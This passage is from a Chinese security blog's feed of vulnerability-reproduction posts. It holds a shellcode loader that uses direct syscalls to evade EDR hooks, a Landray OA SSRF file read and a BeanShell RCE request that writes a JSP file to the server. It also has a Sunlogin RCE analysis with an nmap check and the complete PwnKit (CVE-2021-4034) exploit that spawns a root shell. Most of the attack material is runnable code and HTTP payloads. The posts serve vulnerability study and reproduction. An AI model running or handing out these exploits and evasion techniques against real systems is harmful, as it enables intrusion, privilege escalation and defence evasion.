&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;            &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;            &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;            &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;            &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;            &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;            &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;            &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;            &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;            &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;            &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;            &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;            &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;            &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;            &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;            &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;            &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;            &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;            &quot;\x63\x2e\x65\x78\x65\x00&quot;;    size_t size = sizeof(buf);    void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (sc == NULL)    {        return 0;    }    memcpy(sc, buf, size);    (*(int(*)()) sc)();    return 0;}</code></pre><p>那么要怎么找到VirtualAlloc的底层API呢？通过API Monitor监视API。可以发现（也方便待会syscall照着修改代码）</p><pre><code>* ntdll.dll中保存着执行功能的函数以及系统服务调用存根，ntdll.dll导出了Windows Native API，其具体实现其实在 ntoskrnl.exe 中</code></pre><p>利用windbg获取下层API的参数结构</p><pre><code>x ntdll!NtAllocateVirtualMemory #从dll搜索API函数u &lt;address&gt; #查看地址对应的汇编</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzYQA.png" alt=""></p><p>这段汇编可以理解为将rcx参数指针的值保存到r10，然后将系统调用号传入给eax。计算内存偏移地址里的值，根据标志寄存器的大小来决定是否要跳转到ntdll!NtAllocateVirtualMemory。最后syscall进入内核调用内核函数</p><p>引用一张图<br><img src="https://s1.ax1x.com/2022/04/09/LCztsI.png" alt=""></p><p>我们只需要取</p><pre><code>mov     r10,rcxmov     eax,18hsyscallret</code></pre><p>然后丢进ASM，创建函数。在实例化调用即可<br>syscall.asm</p><pre><code>.codeNtAllocateVirtualMemory procmov r10,rcxmov eax,18hsyscallretNtAllocateVirtualMemory endpend</code></pre><p><img src="https://s1.ax1x.com/2022/04/09/LCzNLt.png" alt=""></p><p>设置ASM属性<br><img src="https://s1.ax1x.com/2022/04/09/LCzaeP.png" alt=""></p><p>导出该函数</p><pre><code>EXTERN_C  NTSTATUS NtAllocateVirtualMemory(    HANDLE    ProcessHandle,    PVOID* BaseAddress,    ULONG_PTR ZeroBits,    PSIZE_T   RegionSize,    ULONG     AllocationType,    ULONG     Protect);</code></pre><p>完整代码如下：<br>（NtAllocateVirtualMemory对着监视的API填就行了）</p><pre><code class="C">// syscalltest.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;EXTERN_C  NTSTATUS NtAllocateVirtualMemory(    HANDLE    ProcessHandle,    PVOID* BaseAddress,    ULONG_PTR ZeroBits,    PSIZE_T   RegionSize,    ULONG     AllocationType,    ULONG     Protect);int main(){    unsigned char buf[] =        &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;        &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;        &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;        &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;        &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;        &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;        &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;        &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;        &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;        &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;        &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;        &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;        &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;        &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;        &quot;\x63\x2e\x65\x78\x65\x00&quot;;    size_t size = sizeof(buf);    void* sc = NULL;    NtAllocateVirtualMemory(GetCurrentProcess(), &amp;sc, 0,&amp;size,MEM_RESERVE |  MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (sc == NULL)    {        return 0;    }    memcpy(sc, buf, sizeof(buf));    (*(int(*)()) sc)();    return 0;}</code></pre><p>生成依赖项勾上masm<br><img src="https://s1.ax1x.com/2022/04/09/LCzddf.png" alt=""><br><img src="https://s1.ax1x.com/2022/04/09/LCzwo8.png" alt=""></p><p>注意事项：size传入NtAllocateVirtualMemory会被修改。不要在memcpy的时候重用 原因是内存在分配的时候会向上取整，比如：比如1500大小的，会分配个2000。重用size变量后会造成memcpy将shellcode拷贝到内存的时大小与数组不符，造成越界读到外边去了<br>造成shellcode运行失败<br><img src="https://s1.ax1x.com/2022/04/09/LCzrWQ.png" alt=""></p><p>现成的一些生成syscall的工具，自动生成asm和c文件</p><pre><code>Syswhispers2 与 Syswhispers 最大的不同在于 Syswhispers2 不再需要指定 Windows 版本，也不再依赖于以往的系统调用表，而是采用了系统调用地址排序的方法，也就是这篇 Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams。其具体含义是先解析 Ntdll.dll 的 导出地址表 EAT，定位所有以 “Zw” 开头的函数，将开头替换成 “Nt”，将 Code stub 的 hash 和地址存储在 SYSCALL_ENTRY 结构的表中，存储在表中的系统调用的索引是SSN（System Service Numbers，系统服务编号）。</code></pre><p><a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="noopener">https://github.com/jthuraisamy/SysWhispers2</a><br><img src="https://s1.ax1x.com/2022/04/09/LCzszj.png" alt=""></p><p>将头文件、asm文件、syscall.c导入项目即可<br>syscall.c改为syscall.cpp引入syscall.h<br><img src="https://s1.ax1x.com/2022/04/09/LCzcyn.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/261582#h3-9" target="_blank" rel="noopener">https://www.anquanke.com/post/id/261582#h3-9</a><br><a href="https://www.ddosi.org/b302/" target="_blank" rel="noopener">https://www.ddosi.org/b302/</a><br><a href="https://cloud.tencent.com/developer/article/1922129" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1922129</a><br><a href="https://lengjibo.github.io/syscall/" target="_blank" rel="noopener">https://lengjibo.github.io/syscall/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;好久没写博客了，工作和在学校的自由完全比不了。怀念初中的她怀念大学无拘无束的生活….&lt;br&gt;如今大家都各自毕业，今生能否相见仍成问题&lt;br&gt;&lt;img src=&quot;https://s1.ax1x.com/2022/04/09/LCzKZ6.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    
    <category term="红队" scheme="http://jiushill.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>蓝凌OA前台SSRF+dataxml.jsp RCE漏洞分析</title>
    <link href="http://jiushill.github.io/posts/980cff8b.html"/>
    <id>http://jiushill.github.io/posts/980cff8b.html</id>
    <published>2022-03-03T11:39:28.000Z</published>
    <updated>2022-03-03T11:55:55.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p>漏洞路径:/sys/ui/extend/varkind/custom.jsp<br><img src="https://s4.ax1x.com/2022/03/03/btekb6.png" alt=""></p><pre><code>&lt;c:import&gt;标签提供了所有&lt;jsp:include&gt;行为标签所具有的功能，同时也允许包含绝对URL。举例来说，使用&lt;c:import&gt;标签可以包含一个FTP服务器中不同的网页内容。url：待导入资源的URL，可以是相对路径和绝对路径，并且可以导入其他主机资源&lt;c:param&gt; 标签用于在 &lt;c:url&gt; 标签中指定参数，而且与 URL 编码相关。在 &lt;c:param&gt; 标签内，name 属性表明参数的名称，value 属性表明参数的值。</code></pre><p>利用SSRF读文件</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 1.1.1.1Content-Length: 42Pragma: no-cacheCache-Control: no-cacheOrigin: http://1.1.1.1Upgrade-Insecure-Requests: 1DNT: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://1.1.1.1/sys/ui/extend/varkind/custom.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=060EB9D7EC3DA6E910B89F3D67BAB52CConnection: closevar={&quot;body&quot;:{&quot;file&quot;:&quot;file:///etc/passwd&quot;}}</code></pre><p><img src="https://s4.ax1x.com/2022/03/03/bteRz9.png" alt=""></p><h2 id="利用dataxml-jsp任意执行代码"><a href="#利用dataxml-jsp任意执行代码" class="headerlink" title="利用dataxml.jsp任意执行代码"></a>利用dataxml.jsp任意执行代码</h2><p>参考链接:<a href="https://websecuritys.cn/archives/lanling2.html" target="_blank" rel="noopener">https://websecuritys.cn/archives/lanling2.html</a><br><a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a></p><p>POC</p><pre><code>POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: 127.0.0.1User-Agent: Go-http-client/1.1Content-Length: 526Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipvar={&quot;body&quot;:{&quot;file&quot;:&quot;/sys/common/dataxml.jsp&quot;}}&amp;s_bean=sysFormulaValidate&amp;script=import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();&amp;type=int&amp;modelName=test</code></pre><p>获取s_bean参数值做分割然后进入循环调用getBean函数(getBean获取实例化的bean的id或者name，定义在xml文件)，最后调用getDataList函数传入RequestContext<br><img src="https://s4.ax1x.com/2022/03/03/btejsI.png" alt=""></p><p>s_bean=sysFormulaValidate，搜索sysFormulaValidate<br><img src="https://s4.ax1x.com/2022/03/03/btmCFS.png" alt=""></p><p>在spring.xml可以看见<br><img src="https://s4.ax1x.com/2022/03/03/btmFzj.md.png" alt=""></p><p>找到对应的jar包，对着getDataList按两下shift。定位到IXMLDataBean.class<br><img src="https://s4.ax1x.com/2022/03/03/btmAQs.png" alt=""></p><p>找到接口<br><img src="https://s4.ax1x.com/2022/03/03/btmee0.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmKFU.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btm3l9.png" alt=""></p><p>可以看到先获取了script参数，然后调用parseValueScript函数<br><img src="https://s4.ax1x.com/2022/03/03/btmaFO.png" alt=""></p><p>继续往下跟<br><img src="https://s4.ax1x.com/2022/03/03/btmr6A.png" alt=""></p><p>首先判断了script是否为NULL，不为NULL去结尾去特殊字符和空格。然后判断是否存在$，如果存在则进入while循环去除$<br><img src="https://s4.ax1x.com/2022/03/03/btmsOI.md.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btmgTf.png" alt=""></p><p>最后拼接，然后调用interpreter.eval()<br>bsh(BeanShell)动态执行java代码：<a href="https://blog.csdn.net/ouyang111222/article/details/48474189" target="_blank" rel="noopener">https://blog.csdn.net/ouyang111222/article/details/48474189</a><br><img src="https://s4.ax1x.com/2022/03/03/btmoXn.png" alt=""><br><img src="https://s4.ax1x.com/2022/03/03/btn0EV.png" alt=""></p><p>利用写文件 getshell</p><pre><code>import%20java.lang.*;import%20java.io.*;Class%20cls=Thread.currentThread().getContextClassLoader().loadClass(&quot;bsh.Interpreter&quot;);String%20path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File%20f=new%20File(path.split(&quot;WEB-INF&quot;)[0]%2B&quot;/loginx.jsp&quot;);f.createNewFile();FileOutputStream%20fout=new%20FileOutputStream(f);fout.write(new%20sun.misc.BASE64Decoder().decodeBuffer(&quot;aGVsbG8=&quot;));fout.close();</code></pre><p>为什么loginxx.jsp访问是200,spring.xml允许匿名访问的如下<br><img src="https://s4.ax1x.com/2022/03/03/btuSPS.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSRF漏洞&quot;&gt;&lt;a href=&quot;#SSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞&quot;&gt;&lt;/a&gt;SSRF漏洞&lt;/h2&gt;&lt;p&gt;漏洞路径:/sys/ui/extend/varkind/custom.jsp&lt;br&gt;&lt;img src=&quot;ht</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://jiushill.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>向日葵RCE漏洞复现分析</title>
    <link href="http://jiushill.github.io/posts/c5ac22a4.html"/>
    <id>http://jiushill.github.io/posts/c5ac22a4.html</id>
    <published>2022-02-17T15:45:27.000Z</published>
    <updated>2022-02-19T05:45:14.021Z</updated>
    
    <content type="html"><![CDATA[<p>复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>漏洞范围：小于或等于11.x<br>复现的版本：11.0.0.33162<br><img src="https://s4.ax1x.com/2022/02/17/HIjjRU.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里跟踪了check接口、路由接口、认证接口这三个<br>首先脱壳，向日葵加了UPX，upx -d脱掉即可<br><img src="https://s4.ax1x.com/2022/02/17/HIvCZR.png" alt=""></p><p>向日葵对应的端口，找到SunloginService服务的PID在找端口即可<br><img src="https://s4.ax1x.com/2022/02/17/HIviIx.png" alt=""></p><p>向日葵在启动的时候会开启该服务，端口绑定在服务里（没更）。向日葵的端口大概是<strong>4w-5w</strong><br><img src="https://s4.ax1x.com/2022/02/17/HIvERO.png" alt=""></p><p>根据PDF里的先获取CID才能后续利用，open IDA shift+F12搜索CID<br><img src="https://s4.ax1x.com/2022/02/17/HIveQe.png" alt=""></p><p>（先连接一次向日葵然后在log里可以看到CID，对应log位置：SunloginClient\log\sunlogin_service.&lt;日期&gt;.log）<br><img src="https://s4.ax1x.com/2022/02/17/HIv1FP.png" alt=""></p><p>根据PDF里的访问/cgi-bin/rpc可以未授权获取到CID。找到路由可以看到对应的处理函数(sub_140E216BA-&gt;找到该函数的方法上面提到的搜索CID字符串跟入其中一个函数在上级便是路由)<br>（懒得截图了，处理函数是sub_140E1C954）<br><img src="https://s4.ax1x.com/2022/02/17/HIvJSS.png" alt=""></p><p>当满足action=verify-haras会返回verify_string而和CID对比两者一致<br><img src="https://s4.ax1x.com/2022/02/17/HIvaes.png" alt=""><br><img src="https://s4.ax1x.com/2022/02/17/HIvBF0.png" alt=""></p><p>当为action为fast-login，是识别码和本地验证码的处理，认证成功后也可以获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIvrWT.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIvcy4.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIv5Y6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIx64P.png" alt=""></p><p>参数需要:action=fast-login&amp;fastcode=&lt;本地识别码&gt;&amp;verify_string=&lt;本地验证码&gt;&amp;use_custom_password=1<br><img src="https://s4.ax1x.com/2022/02/19/HHxec6.png" alt=""></p><p>也可以通过login.cgi验证获取CID<br><img src="https://s4.ax1x.com/2022/02/19/HHx34A.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzPC6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzi8K.png" alt=""></p><p><strong>check接口RCE</strong><br>获取cmd值后，判断是否存在ping命令然后跳到LABEL_27，调用sub_140E20B64执行命令<br><img src="https://s4.ax1x.com/2022/02/17/HIzVDH.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIztVs.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/19/HHxkN9.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzBxU.png" alt=""></p><p><strong>认证接口</strong><br>回到路由，跟踪上一级（或者搜索:{“success”:false,”msg”:”Verification failure”}定位）<br><img src="https://s4.ax1x.com/2022/02/17/HIzgaR.png" alt=""></p><p>可以看到判断cookie是否存在和CID的赋值，最后传入v132判断CID是否正确<br><img src="https://s4.ax1x.com/2022/02/17/HIzWPx.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzHZd.png" alt=""></p><p>如果是请求路径是下面其中一个则会进入到sub_14061D284（也就是刚刚的路由）<br><img src="https://s4.ax1x.com/2022/02/17/HIzXJP.png" alt=""></p><p>nmap检测脚本：</p><pre><code class="lua">local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;local json=require &quot;json&quot;portrule=function(host,port)        if (port.state==&quot;open&quot;) and (port.protocol==&quot;tcp&quot;) then                return true        endendaction=function(host,port)        local status=stdnse.output_table()        local url=string.format(&quot;http://%s:%s&quot;,host.ip,port.number)        local banner=&quot;{\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;Verification failure\&quot;}&quot;        local headers={header={}}        headers[&quot;header&quot;][&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;        local rqt=http.get_url(url,headers)        if (rqt.status==200) and (string.match(rqt.body,banner)) then                status.banner=&quot;SunloginClient&quot;                local uri=&quot;/cgi-bin/rpc&quot;                local postdata=&quot;action=verify-haras&quot;                local cid_check=http.post(host,port,uri,nil,true,postdata)                if(cid_check.status==200) then                        local json_check,json_data=json.parse(cid_check.body)                        if (json_data[&quot;enabled&quot;]==&quot;1&quot;) then                                status.rce=&quot;YES&quot;                                status.cid=json_data[&quot;verify_string&quot;]                        end                end                if (status~=nil) then                        return status                end        endend</code></pre><p><img src="https://s4.ax1x.com/2022/02/17/HoSpLQ.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》&lt;/p&gt;
&lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;漏洞范围：小于或等于11.x&lt;br&gt;复现的版本：</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>pkexec提权漏洞复现</title>
    <link href="http://jiushill.github.io/posts/2b1cd54.html"/>
    <id>http://jiushill.github.io/posts/2b1cd54.html</id>
    <published>2022-01-28T09:04:55.000Z</published>
    <updated>2022-02-17T15:59:28.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。根据作者的发布文章说，在默认安装的Ubuntu、Debian、Fedora和CentOS上都已经成功复现。这个漏洞已经隐藏了12年多，并影响自2009年5月第一个版本以来的所有pkexec版本：（commit c8c3d83，“Add a pkexec(1) command”）<br><img src="https://s4.ax1x.com/2022/01/28/7x4Dte.png" alt=""></p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.存在pkexec命令<br>2.pkexec在suid里<br><img src="https://s4.ax1x.com/2022/01/28/7x5q8H.png" alt=""></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>全”环境变量（例如 LD_PRELOAD）放在 pkexec 的 环境; 如果是正常设置环境变量，这些“不安全”变量通常会被删除（通过 ld.so），如GCONV_PATH就是不安全的环境变量，因为他会导致任意so执行。同时pkexec是一个默认具有suid<br>属性的程序，如果能让其执⾏命令，那么就能导致suid提权了。所以利⽤中允许我们绕过过滤写⼊GCONV_PATH，然后设置gconv-modules文件，触发字符集转换，调用iconv_open加载对应字符集的so文件。</p><p>534行：for循环argc=0，所以不会进入循环，但n已经设置成1<br>610行：argv[1]赋值给path<br><img src="https://s4.ax1x.com/2022/01/28/7xIBzd.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIrQA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIfJg.png" alt=""></p><p>因为argv和envp指针在内存中是连续的，如果argc为0，那么越界argv[1]实际上是envp[0]<br><img src="https://s4.ax1x.com/2022/01/28/7xIbwV.png" alt=""></p><p>如果按照上面的代码逻辑，如果传⼊的命令不是绝对路径，就会在 PATH 环境变量的目录搜索，在赋<br>值回argv</p><p>假设我们执行pkexec，此时argc=0，envp={“xxx”}<br>610行，程序会读取argv[1]到path变量中，也就是”xxx”<br>632行，s = g_find_program_in_path (path)找到该程序的绝对路径，假设为/usr/bin/xxx<br>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了{“/usr/bin/xxx”}<br><img src="https://s4.ax1x.com/2022/01/28/7xoAYD.png" alt=""></p><p>根据找到的函数进行寻找利用：<br>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。<br>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。<br>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p><p><strong>argv[n] = path=s就能重新触发环境变量加载，因为g_printerr()将会调用glibc的函数iconv_open()利用环境变量重新定义了GCONV_PATH，最后找到自己定义的so。加载了gconv_init函数，最后由于又是SUID权限实现了提权其实就是类似于DLL劫持</strong></p><p>CVE-2021-4034</p><pre><code class="c">/** Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char *shell =    &quot;#include &lt;stdio.h&gt;\n&quot;    &quot;#include &lt;stdlib.h&gt;\n&quot;    &quot;#include &lt;unistd.h&gt;\n\n&quot;    &quot;void gconv() {}\n&quot;    &quot;void gconv_init() {\n&quot;    &quot;    setuid(0); setgid(0);\n&quot;    &quot;    seteuid(0); setegid(0);\n&quot;    &quot;    system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\&quot;);\n&quot;    &quot;    exit(0);\n&quot;    &quot;}&quot;;int main(int argc, char *argv[]) {    FILE *fp;    system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;);    system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&quot;);    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);    fprintf(fp, &quot;%s&quot;, shell);    fclose(fp);    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);    char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };    execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);}</code></pre><p><img src="https://s4.ax1x.com/2022/01/28/7xo3tS.png" alt=""></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>新版pkexec已修复了漏洞 (更新pkexec)<br><img src="https://s4.ax1x.com/2022/01/28/7xot6s.png" alt=""></li><li>取消pkexec SUID权限</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://saucer-man.com/information_security/876.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/876.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://jiushill.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>Exchange ProxyShell漏洞复现</title>
    <link href="http://jiushill.github.io/posts/e4d494fa.html"/>
    <id>http://jiushill.github.io/posts/e4d494fa.html</id>
    <published>2022-01-21T15:59:02.000Z</published>
    <updated>2022-01-21T17:38:30.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这周复现了proxyshell这个漏洞，一直嫌麻烦没弄。跟dll跟了两天终于弄明白了</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>影响的漏洞版本：Exchange&gt;9 &lt;=23</p><pre><code>Microsoft Exchange Server 2019 Cumulative Update 9Microsoft Exchange Server 2019 Cumulative Update 8Microsoft Exchange Server 2016 Cumulative Update 20Microsoft Exchange Server 2016 Cumulative Update 19Microsoft Exchange Server 2013 Cumulative Update 23</code></pre><p>漏洞介绍:</p><pre><code>* CVE-2021-34473 - 一个ssrf漏洞* CVE-2021-34523 - Exchange PowerShell BackEnd提权* CVE-2021-31207 - 认证后任意文件写入漏洞</code></pre><p>利用的本质就是在前台服务中存在校验缺失，导致外面发起的请求可以以前台服务的进程作为跳板进行后台服务资源的访问。<br><img src="https://s4.ax1x.com/2022/01/22/7WBmb6.png" 